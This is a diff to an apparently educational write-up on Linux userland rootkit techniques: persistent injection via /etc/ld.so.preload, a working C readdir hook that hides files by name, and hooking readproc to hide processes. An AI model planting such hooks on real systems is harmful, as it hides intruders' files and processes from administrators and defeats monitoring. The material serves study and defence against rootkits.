@@ -16,7 +16,8 @@ I talked a bit about injection and hooking [in the past](https://github.com/yo-y
 Instead of `DLLs`, we will use `.so` files. Those files are `shared objects` and have the same file format as Linux executables (ELFs). They export symbols that can be used later, *conceptually* like Windows does.  Just like Windows has `LoadLibrary` and `GetProcAddress`, Linux has `dlopen` and `dlsym`, and just like Windows PE files can have dependencies on DLLs, Linux ELFs have dependencies on shared objects.  
 Anyway, our strategy will be the following:
 - For injection, we will use the `/etc/ld.so.preload` file. To write to it, we will need root access, but essentially - all files mentioned in that file (that might not exist to begin with) are going to be loaded to new processes. If you're familiar with the `LD_PRELOAD` environment variable, it's the same concept, but done persistently.
-- We get hooking for free. Unlike the Windows dynamic library resolution, that import symbols from specific DLLs (e.g. `kernel32!MapViewOfFile`), on Linux the loader just needs a symbol - once the symbol is resolved it doesn't matter what shared object it comes from. The only thing we need to do is export the right symbol.
+- We get hooking for free. Unlike the Windows dynamic library resolution, that import symbols from specific DLLs (e.g. `kernel32!MapViewOfFile`), on Linux the loader just needs a symbol - once the symbol is resolved it doesn't matter what shared object it comes from. The only thing we need to do is export the right symbol
+- The reason for this is, the LD_PRELOAD environment variable allows your shared library to be 'preloaded' into the process, so its loaded before other shared libraries except from those loaded with LD_AUDIT. LD_PRELOAD allows us to hook functions by simply having the same name as them because when the dynamic linker goes to update the GOT (global offset table) it first looks up the function in the shared library we are preloading
 
 ## Hiding files
 Let's start with hiding files. We will be hooking the [readdir](https://man7.org/linux/man-pages/man3/readdir.3.html) function, which returns a `struct dirent*` - that's a *directory entry* that contain information about the file, including its name:
@@ -35,6 +36,7 @@ struct dirent {
 The `readdir` function returns `NULL` on error or if the directory list is done, but we can simply call the next entry. For that, however, we'll need to call the original `readdir` function, which can be easily done with `dlopen` and `dlsym`:
 
 ```c
+#define _GNU_SOURCE
 #include <dlfcn.h>
 #include <dirent.h>
 #include <string.h>
@@ -45,34 +47,27 @@ typedef struct dirent* (*readdir_pfn_t)(DIR*);
 
 static readdir_pfn_t g_original_readdir = NULL;
 
-struct dirent* readdir(DIR* dirp)
+struct
+dirent*
+readdir(DIR* dirp)
 {
     struct dirent* ret = NULL;
 
     // Validate original function exists
-    if (NULL == g_original_readdir)
-    {
+    if (g_original_readdir == NULL) {
         g_original_readdir = dlsym(RTLD_NEXT, "readdir");
-        if (NULL == g_original_readdir)
-	{
-            goto cleanup;
-        }
+        if (g_original_readdir == NULL)
+	    return ret;
     }
 
     // Invoke and skip directory entries to hide
-    do
-    {
-        ret = g_original_readdir(dirp);
-	      if (NULL == ret)
-	      {
-            goto cleanup;
-	      }
+    while ((ret = g_original_readdir(dirp)) != NULL) {
+         if (strstr(ret->d_name, FILENAME_TO_HIDE))
+	    continue;
+	return ret;
     }
-    while (NULL != strstr(ret->d_name, FILENAME_TO_HIDE));
 
-cleanup:
-
-    // Return the entry
+    // readdir returns NULL when no entries left
     return ret;
 }
 ```
@@ -142,7 +137,7 @@ clean:
 ## Hiding processes
 Let's also remove the `FILENAME_TO_HIDE` from process listing (e.g. in tools like `ps`).  
 Process listing can easily be done by reading the `/proc` filesystem; however, most tools (`ps` included) do not read `procfs` on their own, they instead use a library, and the most well-known library to do that is called [procps](https://gitlab.com/procps-ng/procps).  
-Well, `procps` has a function called `readproc` for process listing - it returns a `proc_t*` which has many, many fields - one of them is `cmdline` which contains the command-line.
+Well, `procps` has a function called `readproc` for process listing - it returns a `proc_t*` which has many, many fields - one of them is `cmdline` which contains the command-line. (You can also achieve hiding processes by hooking getents64 - Humza)
 
 So, we can do something very similar, let's export our `readproc` function and skip entries with `FILENAME_TO_HIDE` in their command-line:
 ```c
